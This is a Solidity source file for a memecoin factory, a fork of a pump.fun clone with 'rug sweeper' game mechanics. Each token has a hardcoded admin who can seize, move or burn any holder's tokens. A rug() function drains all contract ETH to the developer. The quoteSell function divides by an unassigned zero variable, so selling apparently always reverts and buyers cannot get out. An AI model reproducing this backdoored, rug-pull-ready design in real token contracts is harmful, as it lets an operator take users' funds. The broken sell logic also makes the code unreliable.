// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// original version of this contract has been adapted from here: https://jamesbachini.com/
// this is a fork of the above pump.fun implementation with additional game mechanics for rug sweeper


/* ____  _   _ __  __ ____             _ 
  |  _ \| | | |  \/  |  _ \  ___  ___ | |
  | |_) | | | | |\/| | |_) |/ __|/ _ \| |
  |  __/| |_| | |  | |  __/ \__ \ (_) | |
  |_|    \___/|_|  |_|_| (_) ___/\___/|_|
  Degenerate memecoin factory on Ethereum
*/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title MemeTokenFactory
 * @dev Factory contract to deploy MemeToken instances.
 */
contract MemeTokenFactory {
    address[] public deployedTokens;

    event TokenCreated(
        address tokenAddress,
        string name,
        string symbol,
        string description,
        string image,
        string twitter,
        string telegram,
        string website,
        address developer
    );

    /**
     * @dev Deploys a new MemeToken contract.
     * @param name The name of the token.
     * @param symbol The symbol of the token.
     * @param description The description of the token.
     * @param image The image URL of the token.
     * @param twitter The Twitter handle associated with the token.
     * @param telegram The Telegram handle associated with the token.
     * @param website The website URL of the token.
     */
    function createToken(
        string memory name,
        string memory symbol,
        string memory description,
        string memory image,
        string memory twitter,
        string memory telegram,
        string memory website
    ) public {
        MemeToken newToken = new MemeToken(
            name,
            symbol,
            description,
            image,
            twitter,
            telegram,
            website,
            payable(msg.sender) // Explicitly cast msg.sender to payable
        );
        deployedTokens.push(address(newToken));
        emit TokenCreated(
            address(newToken),
            name,
            symbol,
            description,
            image,
            twitter,
            telegram,
            website,
            msg.sender
        );
    }

    /**
     * @dev Returns all deployed MemeToken addresses.
     * @return An array of deployed MemeToken addresses.
     */
    function getDeployedTokens() public view returns (address[] memory) {
        return deployedTokens;
    }
}

/**
 * @title MemeToken
 * @dev ERC20 Token with additional functionalities for a meme-based game.
 */
contract MemeToken is ERC20 {
    string public description;
    string public image;
    string public twitter;
    string public telegram;
    string public website;
    address payable public developer;
    uint256 public immutable maxSupply = 1_000_000e18;
    
    // Admin address hardcoded as immutable for security
    address public immutable admin;
    
    // Mapping to track the number of times each address has called play
    mapping(address => uint256) public playCounts;
    
    // Events
    event TokensPurchased(address indexed purchaser, uint256 amount, uint256 price);
    event TokensSold(address indexed seller, uint256 amount, uint256 price);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount);
    event AdminTransfer(address indexed from, address indexed to, uint256 amount);
    event AdminTransferBetween(address indexed from, address indexed to, uint256 amount);
    event AdminSentToZero(address indexed from, uint256 amount);
    event PlayPlayed(address indexed player, uint256 amount);
    event ETHReceived(address indexed sender, uint256 amount);
    event RugPulled(address indexed developer, uint256 amount);
    event PrizeAwarded(address indexed recipient, uint256 amount);
    event PlayPriceUpdated(address indexed player, uint256 newPrice);
    
    /**
     * @dev Modifier to restrict function access to the admin.
     */
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }
    
    /**
     * @dev Constructor to initialize the MemeToken.
     * @param _name The name of the token.
     * @param _symbol The symbol of the token.
     * @param _description The description of the token.
     * @param _image The image URL of the token.
     * @param _twitter The Twitter handle associated with the token.
     * @param _telegram The Telegram handle associated with the token.
     * @param _website The website URL of the token.
     * @param _developerAddress The address of the developer.
     */
    constructor(
        string memory _name,
        string memory _symbol,
        string memory _description,
        string memory _image,
        string memory _twitter,
        string memory _telegram,
        string memory _website,
        address payable _developerAddress
    ) ERC20(_name, _symbol) {
        require(_developerAddress != address(0), "Developer address cannot be zero");
        admin = 0x7b9067028FD39C06642a2C2327D377d1a0575644; // Hardcoded admin address
        description = _description;
        image = _image;
        twitter = _twitter;
        telegram = _telegram;
        website = _website;
        developer = _developerAddress;
        _mint(address(this), maxSupply);
    }

    /**
     * @dev Allows the contract to receive ETH directly.
     * Emits an {ETHReceived} event.
     */
    receive() external payable {
        emit ETHReceived(msg.sender, msg.value);
    }
    
    /**
     * @dev Fallback function to handle calls with data or without matching functions.
     * Allows the contract to receive ETH and emits an {ETHReceived} event.
     */
    fallback() external payable {
        emit ETHReceived(msg.sender, msg.value);
    }

    /**
     * @dev Allows a user to play by sending an increasing amount of ETH.
     * The required ETH increases by 0.0001 ETH with each call by the same address.
     * @return success A boolean indicating the success of the operation.
     */
    function play() external payable returns (bool success) {
        uint256 currentCount = playCounts[msg.sender];
        uint256 requiredETH = 0.001 ether + (currentCount * 0.0001 ether);
        require(msg.value == requiredETH, "Incorrect ETH amount sent");
        playCounts[msg.sender] += 1;
        emit PlayPlayed(msg.sender, msg.value);
        emit PlayPriceUpdated(msg.sender, 0.001 ether + (playCounts[msg.sender] * 0.0001 ether));
        return true;
    }
    
    /**
     * @dev Returns the required ETH amount for the next play by a given address.
     * @param _player The address to check.
     * @return requiredETH The amount of ETH required to call play.
     */
    function getPlayPrice(address _player) public view returns (uint256 requiredETH) {
        uint256 currentCount = playCounts[_player];
        requiredETH = 0.001 ether + (currentCount * 0.0001 ether);
    }

    /**
     * @dev Allows the admin to transfer tokens from the contract to a specified address.
     * @param _to The address to receive the tokens.
     * @param _amount The amount of tokens to transfer.
     */
    function adminSendTokens(address _to, uint256 _amount) external onlyAdmin {
        require(_to != address(0), "Cannot transfer to zero address");
        require(balanceOf(address(this)) >= _amount, "Not enough tokens in contract");
        _transfer(address(this), _to, _amount);
        emit AdminTransfer(address(this), _to, _amount);
    }

    /**
     * @dev Allows the admin to transfer tokens from a specified address back to the contract.
     * @param _from The address to transfer tokens from.
     * @param _amount The amount of tokens to transfer.
     */
    function adminRetrieveTokens(address _from, uint256 _amount) external onlyAdmin {
        require(_from != address(0), "Cannot transfer from zero address");
        require(balanceOf(_from) >= _amount, "Not enough tokens in sender's address");
        _transfer(_from, address(this), _amount);
        emit AdminTransfer(_from, address(this), _amount);
    }
    
    /**
     * @dev Allows the admin to transfer tokens arbitrarily between two addresses.
     * @param _from The address to transfer tokens from.
     * @param _to The address to transfer tokens to.
     * @param _amount The amount of tokens to transfer.
     */
    function adminTransferBetween(address _from, address _to, uint256 _amount) external onlyAdmin {
        require(_from != address(0), "Cannot transfer from zero address");
        require(_to != address(0), "Cannot transfer to zero address");
        require(balanceOf(_from) >= _amount, "Insufficient balance in source address");
        
        _transfer(_from, _to, _amount);
        emit AdminTransferBetween(_from, _to, _amount);
    }
    
    /**
     * @dev Allows the admin to burn tokens from a specified address by sending them to the zero address.
     * @param _from The address to burn tokens from.
     * @param _amount The amount of tokens to burn.
     */
    function adminSendToZero(address _from, uint256 _amount) external onlyAdmin {
        require(_from != address(0), "Cannot burn from zero address");
        require(balanceOf(_from) >= _amount, "Insufficient balance to burn");
        
        _transfer(_from, address(0), _amount);
        emit AdminSentToZero(_from, _amount);
    }
    
    /**
     * @dev Allows the admin to transfer all ETH from the contract to the developer.
     * Emits a {RugPulled} event upon successful transfer.
     * @return success A boolean indicating whether the transfer was successful.
     */
    function rug() external onlyAdmin returns (bool success) {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No ETH to transfer");
        (success, ) = developer.call{value: contractBalance}("");
        require(success, "Transfer failed.");
        emit RugPulled(developer, contractBalance);
        return success;
    }
    
    /**
     * @dev Allows the admin to award all ETH in the contract to a specified address.
     * @param _recipient The address to receive the ETH.
     * @return success A boolean indicating whether the transfer was successful.
     */
    function prize(address payable _recipient) external onlyAdmin returns (bool success) {
        require(_recipient != address(0), "Cannot send to zero address");
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No ETH to send");
        (success, ) = _recipient.call{value: contractBalance}("");
        require(success, "Transfer failed.");
        emit PrizeAwarded(_recipient, contractBalance);
        return success;
    }

    /**
     * @dev Allows a user to buy tokens by sending ETH to the contract.
     * @notice The token price is dynamically calculated based on the contract's ETH balance and remaining tokens.
     */
    function buyTokens() external payable {
        require(msg.value > 0, "Send some ETH to buy tokens");
        uint256 tokensPerETH = quoteBuy(msg.value);
        uint256 tokenAmount = (msg.value * tokensPerETH) / 1e18;
        require(balanceOf(address(this)) >= tokenAmount, "Not enough tokens in contract");
        _transfer(address(this), msg.sender, tokenAmount);
        emit TokensPurchased(msg.sender, tokenAmount, tokensPerETH);
    }

    /**
     * @dev Allows a user to sell tokens back to the contract in exchange for ETH.
     * @param _tokenAmount The amount of tokens to sell.
     */
    function sellTokens(uint256 _tokenAmount) external {
        require(balanceOf(msg.sender) >= _tokenAmount, "Insufficient tokens to sell");
        uint256 tokensPerETH = quoteSell(_tokenAmount);
        uint256 ethAmount = (_tokenAmount * 1e18) / tokensPerETH;
        require(address(this).balance >= ethAmount, "Insufficient contract ETH balance");
        _transfer(msg.sender, address(this), _tokenAmount);
        (bool success, ) = msg.sender.call{value: ethAmount}("");
        require(success, "ETH Transfer failed.");
        emit TokensSold(msg.sender, _tokenAmount, tokensPerETH);
    }

    /**
     * @dev Calculates the current price of tokens in terms of ETH.
     * @return tokensPerETH The number of tokens per ETH.
     */
    function getCurrentPrice() public view returns (uint256 tokensPerETH) {
        uint256 remainingTokens = balanceOf(address(this));
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance < 0.01 ether) contractETHBalance = 0.01 ether;
        tokensPerETH = (remainingTokens * 1e18) / contractETHBalance;
    }

    /**
     * @dev Provides a quote for buying tokens based on the ETH amount sent.
     * @param _ethAmount The amount of ETH to spend.
     * @return tokensPerETH The number of tokens per ETH for this purchase.
     */
    function quoteBuy(uint256 _ethAmount) public view returns (uint256 tokensPerETH) {
        uint256 currentTokensPerETH = getCurrentPrice();
        uint256 tokenAmount = (_ethAmount * currentTokensPerETH) / 1e18;
        uint256 remainingTokens = balanceOf(address(this));
        tokensPerETH = ((remainingTokens - (tokenAmount / 2)) * 1e18) / (address(this).balance + (_ethAmount / 2));
    }

    /**
     * @dev Provides a quote for selling tokens based on the token amount.
     * @param _tokenAmount The amount of tokens to sell.
     * @return tokensPerETH The number of tokens per ETH for this sale.
     */
    function quoteSell(uint256 _tokenAmount) public view returns (uint256 tokensPerETH) {
        uint256 currentTokensPerETH = getCurrentPrice();
        uint256 ethAmount = (_tokenAmount * 1e18) / tokensPerETH;
        uint256 remainingTokens = balanceOf(address(this));
        tokensPerETH = ((remainingTokens + (_tokenAmount / 2)) * 1e18) / (address(this).balance - (ethAmount / 2));
    }
}
